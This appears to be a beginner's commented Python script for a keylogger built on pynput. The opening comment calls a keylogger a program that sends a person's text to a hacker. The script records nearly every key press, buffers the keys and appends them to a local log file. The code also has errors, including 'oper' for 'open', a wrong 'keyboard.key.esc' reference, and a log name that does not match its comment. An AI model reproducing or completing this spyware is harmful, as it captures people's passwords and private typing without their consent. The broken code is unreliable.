#keylogger = a keylogger is  a  program  that sends  your text  to  the  hacker.
# the avoid high  processing load,we can use comparison operators in a condition(if) and a list 
from pynput import keyboard
ignore_keys= [keyboard.Key.shift,keyboard.Key.ctrl,keyboard.Key.alt]
#creat an  empty  list called  buffer  .  this  temporarily  stors pressed  keys  so we  can write  them  all at once later
buffer = []
#define a  function  called  on_press that  runs  every time a  key  is  pressed  
def on_press(key):
    #if  the  key  is  in  the  ignore keys list  , skip  it  
    if key in  ignore_keys:
        return
    #start of the try block-meaning try to do  this  ,if an error happens , go to excpet.
    try:
        #if the key is  a  letters  or  numbers  , add  it to  the  buffer  list  
        buffer.append(key.char)
        #if  an  AttributeError occurs(i.e.the  key has  no  char(special keys like enter , space ), go  to this  block)
    except AttributeError:
        #add special  keys to the  list like [key.enter,key.space,...]
        buffer.append(f"[{key}]")
#check  if  the  number  of  times  in  buffer  is  15  or  more .
    if len(buffer)>=15:
        #open  the  file log.txt in append  mode(with)means  file closes  automatically.
        with oper("log.tex","a") as f:
            f.write("".join(buffer))
            buffer.clear()
            
def on_release(key):
    if key ==keyboard.key.esc:
        if buffer:
            with open("log.tex","a") as f:
                f.write("".join(buffer))
                
        return False
    
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()            
                                

